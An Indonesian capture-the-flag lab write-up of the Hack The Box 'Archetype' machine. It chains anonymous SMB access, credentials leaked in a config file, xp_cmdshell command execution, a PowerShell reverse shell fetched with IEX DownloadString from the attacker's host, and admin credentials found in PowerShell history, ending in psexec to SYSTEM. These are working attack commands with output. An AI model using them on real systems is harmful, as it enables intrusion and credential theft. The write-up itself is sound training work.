# Archetype — SMB Misconfiguration + MSSQL RCE + PowerShell History PrivEsc

**Date:** 2026-04-19
**Platform:** Hack The Box — Starting Point Tier 2
**Difficulty:** Very Easy
**Category:** Network / Windows / OS

---

## Target
Windows Server 2019 machine dengan dua service utama yang terbuka: SMB (port 445) dan Microsoft SQL Server 2017 (port 1433). Machine ini mensimulasikan skenario nyata di mana admin ceroboh menyimpan kredensial database di dalam file konfigurasi yang bisa diakses publik lewat SMB share, lalu SQL Server dikonfigurasi dengan fitur berbahaya yang memungkinkan eksekusi command Windows langsung dari query SQL.

## Vulnerability
Tiga celah yang saling berkaitan:

1. **SMB Misconfiguration** — Share `backups` bisa diakses tanpa autentikasi (anonymous/guest), padahal berisi file konfigurasi sensitif.
2. **Credentials in Config File** — File `prod.dtsConfig` menyimpan username dan password SQL Server dalam plaintext di dalam connection string.
3. **xp_cmdshell Abuse + PowerShell History** — SQL Server bisa dimanfaatkan untuk mengaktifkan `xp_cmdshell` dan menjalankan command Windows. Setelah masuk, riwayat PowerShell menyimpan kredensial Administrator dalam plaintext.

## Tools Used
- **Nmap** — port scanning & service enumeration
- **smbclient** — SMB share enumeration & file download
- **impacket-mssqlclient** — koneksi ke Microsoft SQL Server
- **Python3 http.server** — HTTP server untuk serve reverse shell script
- **Netcat (nc)** — listener untuk menangkap reverse shell
- **PowerShell** — reverse shell script di sisi target
- **WinPEAS** — Windows privilege escalation enumeration
- **impacket-psexec** — remote login sebagai Administrator

---

## Exploitation Steps

### Step 1 — Reconnaissance (Nmap Scan)
Scan semua port untuk mengetahui service apa yang berjalan di target.

```bash
nmap -sV -sC -T4 10.129.117.211
```

| Flag | Fungsi |
|------|--------|
| `-sV` | Deteksi versi service |
| `-sC` | Jalankan default scripts |
| `-T4` | Speed scan, aman di HTB |

**Hasil:**
```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017
```

Dua service utama yang menarik: **SMB (445)** dan **MSSQL (1433)**.

---

### Step 2 — SMB Enumeration
List semua share yang tersedia di target menggunakan anonymous login.

```bash
smbclient -N -L 10.129.117.211
```

| Flag | Fungsi |
|------|--------|
| `-N` | No password (anonymous) |
| `-L` | List semua share |

**Hasil:**
```
Sharename    Type    Comment
ADMIN$       Disk    Remote Admin
backups      Disk
C$           Disk    Default share
IPC$         IPC     Remote IPC
```

Share **`backups`** adalah custom share (non-default) yang mencurigakan. Share default seperti `ADMIN$` dan `C$` otomatis di-protect oleh Windows dan hanya bisa diakses Administrator. Share custom sering kali misconfigured dan bisa diakses tanpa password.

---

### Step 3 — Akses SMB Share & Download File
Masuk ke share `backups` dan download file yang ada.

```bash
smbclient -N \\\\10.129.117.211\\backups
```

Di dalam smbclient:
```
smb: \> ls
  prod.dtsConfig    AR    609    Mon Jan 20 07:23:02 2020

smb: \> get prod.dtsConfig
smb: \> exit
```

Cara bedain file vs folder di smbclient:
- **D** = Directory → pakai `cd`
- **AR** = File (Archive, Read-only) → pakai `get`

**Baca isi file:**
```bash
cat prod.dtsConfig
```

**Hasil:**
```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;Provider=SQLNCLI10.1;</ConfiguredValue>
```

Kredensial ditemukan:
| Info | Value |
|------|-------|
| Username | ARCHETYPE\sql_svc |
| Password | M3g4c0rp123 |

File `.dtsConfig` adalah file konfigurasi SSIS (SQL Server Integration Services) yang menyimpan connection string — termasuk username dan password dalam plaintext. Nama `prod` menandakan ini adalah konfigurasi **production** (sistem aktif, bukan test).

---

### Step 4 — Login ke MSSQL
Gunakan kredensial yang ditemukan untuk login ke SQL Server menggunakan Impacket.

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.117.211 -windows-auth
```

Flag `-windows-auth` dipakai karena username menggunakan format `DOMAIN\username` — ini menandakan akun Windows/Active Directory, bukan akun SQL Server lokal.

**Berhasil masuk:**
```
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

---

### Step 5 — Aktifkan xp_cmdshell
`xp_cmdshell` adalah stored procedure MSSQL yang bisa mengeksekusi command Windows langsung dari query SQL. By default dinonaktifkan karena sangat berbahaya.

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

`show advanced options` harus diaktifkan dulu karena `xp_cmdshell` tersembunyi di balik advanced options. `RECONFIGURE` dipakai untuk menerapkan perubahan konfigurasi. Angka `1` = aktif, `0` = nonaktif.

**Test eksekusi command:**
```sql
EXEC xp_cmdshell 'whoami';
```

Output: `archetype\sql_svc` — RCE berhasil!

---

### Step 6 — Reverse Shell
Upgrade dari RCE per-command menjadi interactive shell. Butuh 3 terminal di Kali.

**Buat script reverse shell di Kali:**
```bash
cat > shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.162",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
EOF
```

IP yang dipakai adalah IP `tun0` (VPN HTB), bukan `eth0`. Cek dengan `ip a show tun0`.

**Terminal 2 — HTTP Server (serve file ke target):**
```bash
python3 -m http.server 80
```

**Terminal 3 — Netcat Listener (tangkap koneksi balik):**
```bash
nc -lvnp 443
```

| Flag | Fungsi |
|------|--------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS lookup |
| `-p` | Port yang dipakai |

Port 443 dipakai agar traffic terlihat seperti HTTPS biasa dan tidak diblokir firewall.

**Terminal 1 (MSSQL) — Trigger download & eksekusi:**
```sql
EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.162/shell.ps1\")"';
```

**Alur yang terjadi:**
```
MSSQL suruh Windows → download shell.ps1 dari HTTP server Kali
HTTP Server (T2)    → kirim file → 200 OK
shell.ps1 jalan     → Windows konek balik ke port 443
NC Listener (T3)    → dapat koneksi → SHELL AKTIF!
```

**Konfirmasi shell:**
```
PS C:\Windows\system32> whoami
archetype\sql_svc
```

---

### Step 7 — User Flag
```powershell
type C:\Users\sql_svc\Desktop\user.txt
```

Flag: `3e7b102e78218**********************`

---

### Step 8 — Privilege Escalation via PowerShell History
PowerShell menyimpan riwayat command yang pernah diketik user di file `ConsoleHost_history.txt`. Admin sering mengetik command yang mengandung kredensial di sini.

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Hasil:**
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

Jackpot! Kredensial Administrator ditemukan:
| Info | Value |
|------|-------|
| Username | administrator |
| Password | MEGACORP_4dm1n!! |

> **Catatan:** WinPEAS juga bisa menemukan file ini secara otomatis. Tapi mengecek PowerShell history secara manual lebih cepat dan sering kali sudah cukup.

---

### Step 9 — Login sebagai Administrator (psexec)
Gunakan kredensial Administrator untuk mendapatkan shell level SYSTEM.

```bash
impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.129.95.187
```

**Konfirmasi:**
```
C:\Windows\system32> whoami
nt authority\system
```

`nt authority\system` = level akses tertinggi di Windows.

---

### Step 10 — Root Flag
```cmd
cd C:\Users\Administrator\Desktop
dir
type root.txt
```

Flag: 

---

## Proof
```
User Flag : 
Root Flag : 
```

---

## Lessons Learned

**Hal baru yang dipelajari:**
- SMB share custom bisa diakses anonymous jika admin lupa set permission — selalu enumerate share sebelum lanjut ke service lain
- File `.dtsConfig` adalah file konfigurasi SSIS yang sering menyimpan kredensial database dalam plaintext
- `xp_cmdshell` bisa mengubah SQL Server menjadi pintu masuk RCE ke sistem Windows
- PowerShell history adalah goldmine — admin sering tidak sadar bahwa command yang mereka ketik (termasuk yang mengandung password) tersimpan otomatis
- Reverse shell membutuhkan 3 komponen terpisah: HTTP server (serve file), NC listener (tangkap koneksi), dan trigger (suruh target download & eksekusi)
- Perbedaan Windows Authentication vs SQL Authentication: format `DOMAIN\user` = Windows auth, perlu flag `-windows-auth`

**Kesalahan yang dibuat:**
- Typo ekstensi file: `.ps1` (huruf L kecil) sering terbaca sebagai `.ps1` (angka 1) di terminal — perhatikan font terminal
- Lupa bahwa `cat` adalah command Linux, bukan Windows — di Windows CMD pakai `type`
- Coba jalankan `xp_cmdshell` sebelum mengaktifkan `show advanced options` — selalu aktifkan advanced options dulu

**Yang ingin dieksplorasi lebih lanjut:**
- WinPEAS lebih dalam — belajar filter output yang relevan (fokus warna merah/kuning)
- Alternatif cari kredensial: registry, unattend.xml, scheduled tasks
- Teknik privesc Windows lainnya selain PowerShell history
- Cara mengamankan MSSQL agar tidak bisa dieksploit dengan cara ini